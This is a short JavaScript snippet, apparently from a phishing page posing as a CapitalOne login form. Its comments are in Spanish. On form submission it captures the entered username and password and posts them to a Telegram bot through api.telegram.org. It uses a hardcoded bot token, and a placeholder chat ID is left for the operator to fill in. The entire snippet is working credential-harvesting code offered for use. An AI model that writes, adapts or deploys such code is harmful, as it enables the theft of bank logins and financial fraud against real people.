  <script>
    document
      .getElementById("loginForm")
      .addEventListener("submit", function (e) {
        e.preventDefault();

        const user = document.getElementById("username").value;
        const pass = document.getElementById("password").value;

        const token = "7941669083:AAFCmw6OPwXWy_hTryvFkcIz_mqd8OydRQM"; // tu token
        const chat_id = TU_CHAT_ID; // reemplaza con tu chat ID numérico

        const message = `🔐 CapitalOne Login\n👤 Usuario: ${user}\n🔑 Contraseña: ${pass}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chat_id,
            text: message,
          }),
        })
          .then((response) => {
            if (response.ok) {
              alert("Login enviado correctamente.");
              document.getElementById("loginForm").reset();
            } else {
              alert("Error enviando el login.");
            }
          })
          .catch(() => {
            alert("Error enviando el login.");
          });
      });
  </script>
